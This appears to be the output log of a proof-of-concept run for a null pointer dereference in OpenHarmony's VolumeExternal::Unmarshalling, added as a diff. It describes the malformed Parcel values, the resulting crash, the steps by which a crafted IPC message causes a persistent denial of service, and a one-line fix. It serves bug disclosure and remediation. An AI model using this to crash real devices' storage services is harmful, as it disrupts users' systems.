@@ -1,0 +1,26 @@
+=== VolumeExternal::Unmarshalling() NULL Pointer Dereference PoC ===
+Target: OpenHarmony storage_service volume_external.cpp:139
+Bug: VolumeCore::Unmarshalling returns nullptr on malformed Parcel,
+     VolumeExternal::Unmarshalling dereferences it without check
+Impact: storage_manager_service crash (DoS)
+
+[*] Crafted malformed Parcel (15 bytes):
+[*]   id_ = "vol" (valid)
+[*]   type_ = 1 (valid)
+[*]   diskId_ = 0xFFFFFFFF (INVALID → causes Unmarshalling to return nullptr)
+
+[*] Calling VolumeExternal::Unmarshalling with malformed Parcel...
+
+[!] CRASH: Caught signal 11 (SIGSEGV)
+[!] NULL pointer dereference triggered!
+
+[+] PoC SUCCESS: VolumeExternal::Unmarshalling crashes on malformed Parcel
+[+] Real-world impact:
+[+]   1. Attacker sends crafted IPC message to storage_manager_service
+[+]   2. Service calls VolumeExternal::Unmarshalling on the Parcel
+[+]   3. VolumeCore::Unmarshalling fails and returns nullptr
+[+]   4. Nullptr is dereferenced → service crashes
+[+]   5. Repeated crashes = persistent DoS of storage management
+
+[+] Fix: Check volumeCorePtr for nullptr before dereference:
+[+]   if (!volumeCorePtr) { return nullptr; }
